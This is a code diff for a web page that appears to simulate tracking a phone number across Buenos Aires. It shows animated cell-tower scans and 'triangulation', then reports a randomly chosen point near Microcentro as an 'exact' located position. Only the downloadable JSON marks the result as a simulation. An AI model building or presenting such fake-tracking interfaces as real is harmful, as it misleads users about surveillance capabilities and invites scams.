+      // reset
+      if(gMarker){ gMarker.setMap(null); gMarker=null; } if(gCircle){ gCircle.setMap(null); gCircle=null; }
+      clearTimers(); stopSectorSweep(); clearTriangulation(); resetHeat(); heatmap.setMap(map);
+      map.fitBounds(baBounds); map.setOptions({restriction:baRestriction});
+      hud.style.display='flex'; statusEl.textContent='Iniciando Rastreo…'; statusEl.className='status';
+
+      const DURATION=180000, T_INIT=Math.round(DURATION*0.08), T_SCAN=Math.round(DURATION*0.74), T_TRI=Math.round(DURATION*0.15), T_LOCK=DURATION-(T_INIT+T_SCAN+T_TRI);
+      startProgress(DURATION);
+      hudStep.textContent='Inicializando módulos…'; hudSub.textContent='Señales celulares · GNSS · Wi-Fi público';
+      schedule(()=>{ hudStep.textContent='Sincronizando relojes de red…'; hudSub.textContent='Operadores disponibles: analizando…'; }, Math.floor(T_INIT*0.5));
+
+      const order=[...BA_CABA].sort(()=>Math.random()-0.5);
+      const stepDur=Math.max(700, Math.floor(T_SCAN/order.length));
+      for(let i=0;i<order.length;i++){
+        schedule(((i)=>()=>{ const d=order[i];
+          hudStep.textContent=`Analizando distrito: ${d.name}…`; hudSub.textContent='Normalizando intensidad de señales';
+          const center={lat:d.lat,lon:d.lon}; map.panTo({lat:center.lat,lng:center.lon});
+          startSectorSweep(center, 900 + d.spanKm*400);
+          for(let k=0;k<5;k++) schedule(()=>spawnPing(center.lat + (Math.random()*2-1)*kmLat(0.6), center.lon + (Math.random()*2-1)*kmLon(0.6,center.lat)), 120*k);
+          addHeatCluster(center, Math.max(1.8,d.spanKm), 20, 1.1);
+        })(i), T_INIT + i*stepDur);
+      }
+
+      // Lock final en Ubicacion
+      const pick = MICRO_CENTRO;
+      const ptFinal = randomPointInCircle({ lat: pick.lat, lon: pick.lon }, 900);
+      const randLat = +ptFinal.lat.toFixed(6);
+      const randLon = +ptFinal.lon.toFixed(6);
+      const acc = 80 + Math.floor(Math.random()*420); // 80–500 m
+
+      let ellipseShape=null;
+      schedule(()=>{ hudStep.textContent='Triangulando fuentes…'; hudSub.textContent='Ajuste bayesiano · Filtros de Kalman';
+        map.panTo({lat:pick.lat,lng:pick.lon}); map.setZoom(12);
+        placeTowersAround({lat:pick.lat,lon:pick.lon}, 3 + Math.floor(Math.random()*2));
+        addHeatCluster({lat:pick.lat,lon:pick.lon}, 2.6, 90, 2.4);
+        startSectorSweep({lat:pick.lat,lon:pick.lon}, 1400);
+      }, T_INIT + T_SCAN + Math.floor(T_TRI*0.15));
+
+      schedule(()=>{ hudStep.textContent='Reduciendo área probable…'; hudSub.textContent='Calibración multi-trayecto';
+        addHeatCluster({lat:pick.lat,lon:pick.lon}, 1.8, 70, 3.0);
+        ellipseShape = drawConfidenceEllipse({lat:randLat,lon:randLon}, 600, 380, Math.random()*60);
+      }, T_INIT + T_SCAN + Math.floor(T_TRI*0.55));
+
+      schedule(()=>{ hudStep.textContent='Líneas de rumbo y fijación…'; hudSub.textContent='Combinación de observaciones';
+        drawLobsTo({lat:randLat,lon:randLon});
+      }, T_INIT + T_SCAN + Math.floor(T_TRI*0.80));
+
+      schedule(()=>{ stopSectorSweep();
+        finalResult={simulated:true, generated_at:new Date().toISOString(), phone_full:e164, lat:randLat, lon:randLon, accuracy:acc, city:`Buenos Aires — ${pick.name}`, origin:(ipLoc?'IP':'Pais')};
+        const pos=new google.maps.LatLng(finalResult.lat, finalResult.lon);
+        map.panTo(pos); map.setZoom(15);
+        gMarker=new google.maps.Marker({position:pos,map,title:'Ubicación aproximada'});
+        gCircle=new google.maps.Circle({map,center:pos,radius:finalResult.accuracy,strokeColor:'#4f9fff',strokeOpacity:.95,strokeWeight:1,fillColor:'#4f9fff',fillOpacity:.10});
+        if(ellipseShape){ ellipseShape.setMap(null); }
+        modalText.innerHTML=`<strong>Ubicación Localizada:</strong> ${finalResult.city}<br><small style="color:#a9bbd8">Precisión Exacta: ~${finalResult.accuracy} m · origen: ${finalResult.origin}</small>`;
+        modalBack.style.display='flex'; stopProgress(); hud.style.display='none'; statusEl.textContent='Localizacion completada.'; statusEl.className='status ok';
+      }, T_INIT + T_SCAN + T_TRI + T_LOCK);
+    }
+
+    function resetAll(){
+      clearTimers(); stopSectorSweep(); clearTriangulation();
+      if(gMarker){gMarker.setMap(null);gMarker=null;} if(gCircle){gCircle.setMap(null);gCircle=null;}
+      stopProgress(); hud.style.display='none'; hideCarrierHud();
+      resetHeat(); heatmap.setMap(null); map.fitBounds(baBounds); map.setOptions({restriction:baRestriction});
+      statusEl.textContent='Listo.'; statusEl.className='status';
+    }
+
+    function downloadJSON(){
+      if(!finalResult) return alert('No hay resultado para descargar.');
+      const blob=new Blob([JSON.stringify({simulated:true,generated_at:finalResult.generated_at,phone_full:finalResult.phone_full,lat:finalResult.lat,lon:finalResult.lon,accuracy_m:finalResult.accuracy,city:finalResult.city,origin:finalResult.origin,ip_info:ipLoc||null,note:"Demostración; no representa una ubicación real."},null,2)],{type:'application/json'});
+      const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url; a.download=`ubicacion_demo_${(finalResult.phone_full||'sin-num')}.json`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+    }
+
+    document.getElementById('simulateBtn').addEventListener('click', startSimulation);
+    document.getElementById('resetBtn').addEventListener('click', resetAll);
+    document.getElementById('downloadBtn').addEventListener('click', downloadJSON);
+    document.getElementById('closeModal').addEventListener('click', ()=> document.getElementById('modalBack').style.display='none');
+    number.addEventListener('keydown', (e)=>{ if(e.key==='Enter' && !simulateBtn.disabled) startSimulation(); });
+  </script>
+
+  <script>
+    // Carga dinámica de Maps desde env expuestos por Vercel
+    (function(){
+      fetch('/api/env').then(r=>r.ok?r.json():Promise.reject()).then(cfg=>{
+        var k = cfg.googleMapsApiKey || '';
+        var src = 'https://maps.googleapis.com/maps/api/js?key='+encodeURIComponent(k)+'&libraries=geometry,visualization&v=weekly&callback=initMap';
+        var s = document.createElement('script'); s.src=src; s.async=true; s.defer=true; document.body.appendChild(s);
+      }).catch(function(){
+        alert('No se pudo cargar Google Maps. Revisa la configuración de variables en Vercel.');
+      });
+    })();
+  </script>
+</body>
+</html>
